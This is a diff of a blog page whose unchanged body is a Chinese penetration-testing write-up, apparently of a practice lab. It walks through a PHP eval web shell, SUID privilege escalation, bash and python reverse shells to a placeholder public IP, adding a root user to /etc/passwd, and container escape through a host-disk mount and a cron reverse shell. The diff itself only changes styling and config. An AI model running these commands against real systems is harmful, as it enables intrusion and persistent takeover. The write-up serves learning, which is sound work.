@@ -56,7 +56,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -274,7 +274,7 @@
               <h2 id="1-目标界面"><a href="#1-目标界面" class="headerlink" title="1. 目标界面"></a>1. 目标界面</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>搞半天，没进去。。。。</p>
 <p>经过提示，了解到了一句话执行的原理，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
 
 <p>一句话在每次执行时，接收变量cmd传进去的参数 <code>cmd=phpinfo(); </code> 使用eval函数执行 phpinfo(); 命令。</p>
 <p>了解后就是猜参数名的过程。</p>
@@ -284,19 +284,19 @@
 <p>!<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png" srcset="/img/loading.gif" lazyload></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86979">利用可执行文件SUID</a></p>
 <p>通过命令查看</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">touch suid <span class="hljs-comment"># 也可以不用创建，只要查找的文件真实存在即可</span><br>find suid -<span class="hljs-built_in">exec</span> whoami \;<br></code></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">touch suid <span class="hljs-comment"># 也可以不用创建，只要查找的文件真实存在即可</span><br>find suid -<span class="hljs-built_in">exec</span> whoami \;<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="3-反弹shell-，以及获取完全交互式shell"><a href="#3-反弹shell-，以及获取完全交互式shell" class="headerlink" title="3. 反弹shell ，以及获取完全交互式shell"></a>3. 反弹shell ，以及获取完全交互式shell</h2><p>公网nc 监听 端口</p>
 <p>bash 反弹 </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1<br></code></pre></div></td></tr></table></figure>
 
 <p>失败。。。</p>
 <p>使用 python 反弹shell 到公网</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;公网ip&quot;,监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-p&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;公网ip&quot;,监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-p&quot;]);&#x27;</span><br></code></pre></div></td></tr></table></figure>
 
 <p>保存为shll.sh ,之后执行</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png" srcset="/img/loading.gif" lazyload></p>
@@ -314,7 +314,7 @@
 </li>
 <li><p>没有jobcontrol等</p>
 <p>接下来使用python获取完全交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 接下来在公网的机器上执行</span><br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&quot;import pty; pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-p&#x27;])&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"> 启用python交互式</span><br><span class="hljs-meta">#</span><span class="bash"> 把它丢到后台挂起</span><br><span class="hljs-meta">$</span><span class="bash"> ctrl + z</span>   <br><span class="hljs-meta">#</span><span class="bash"> 重置stty，也就意味着你看不到输入的内容</span><br><span class="hljs-meta">$</span><span class="bash"> stty raw -<span class="hljs-built_in">echo</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> 把后台挂起的程序调回前台 ，命令不显示</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">fg</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> 完全刷新终端屏幕</span><br><span class="hljs-meta">$</span><span class="bash"> 回车 ，再回车 两次</span><br><span class="hljs-meta">$</span><span class="bash"> reset</span>  <br><span class="hljs-meta">$</span><span class="bash"> ctrl + c</span><br><span class="hljs-meta">#</span><span class="bash"> 接下来设置环境变量，根据第一步得到的环境变量来设置</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">export</span> SHELL=bash</span>   <br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 接下来在公网的机器上执行</span><br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&quot;import pty; pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-p&#x27;])&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"> 启用python交互式</span><br><span class="hljs-meta">#</span><span class="bash"> 把它丢到后台挂起</span><br><span class="hljs-meta">$</span><span class="bash"> ctrl + z</span>   <br><span class="hljs-meta">#</span><span class="bash"> 重置stty，也就意味着你看不到输入的内容</span><br><span class="hljs-meta">$</span><span class="bash"> stty raw -<span class="hljs-built_in">echo</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> 把后台挂起的程序调回前台 ，命令不显示</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">fg</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> 完全刷新终端屏幕</span><br><span class="hljs-meta">$</span><span class="bash"> 回车 ，再回车 两次</span><br><span class="hljs-meta">$</span><span class="bash"> reset</span>  <br><span class="hljs-meta">$</span><span class="bash"> ctrl + c</span><br><span class="hljs-meta">#</span><span class="bash"> 接下来设置环境变量，根据第一步得到的环境变量来设置</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">export</span> SHELL=bash</span>   <br></code></pre></div></td></tr></table></figure>
 
 <p>完美了,但是反弹的shell并不是root 用户，接下来执行</p>
 <p>find suid -exec /bin/bash -p ;</p>
@@ -332,28 +332,28 @@
 <p><code>fdisk -l</code> 查看磁盘文件</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png" srcset="/img/loading.gif" lazyload></p>
 <p>新建一个目录, 将/dev/vda1挂载至新建的目录</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">mkdir</span> <span class="hljs-keyword">abc</span><br>mount /dev/vda1 <span class="hljs-keyword">abc</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-built_in">mkdir</span> <span class="hljs-keyword">abc</span><br>mount /dev/vda1 <span class="hljs-keyword">abc</span><br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png" srcset="/img/loading.gif" lazyload></p>
 <p>充满波折，不懂。。。</p>
 <p>换个方法，</p>
 <p>使用 /etc/passwd 创建root用户，</p>
 <p>首先，使用perl语言生成带有盐值的密码：</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span><br></code></pre></div></td></tr></table></figure>
 
 <p>然后执行下面这条命令，成功将test用户的信息加入 /etc/passwd 文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd<br></code></pre></div></td></tr></table></figure>
 
 <p>su test 切换过去</p>
 <p>再执行 mount  /dev/vda1 abc</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/12.png" srcset="/img/loading.gif" lazyload></p>
 <p>现在能查看宿主机文件，接下来逃逸到宿主机</p>
 <p>通过写入计划任务到宿主机</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1&#x27; &gt;&gt; abc/var/spool/cron/root<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1&#x27; &gt;&gt; abc/var/spool/cron/root<br></code></pre></div></td></tr></table></figure>
 
 <p>将python 反弹的脚本写进去，同样gg</p>
 <p>最终，直接将反弹shell的脚本，写入宿主机的目录下 </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim abc/root/shell.sh <br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">vim abc/root/shell.sh <br></code></pre></div></td></tr></table></figure>
 
 <p>之后，赋予权限，直接执行反弹回shell</p>
 
@@ -544,7 +544,7 @@
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
     NProgress.start()
     window.addEventListener('load', function() {
       NProgress.done();
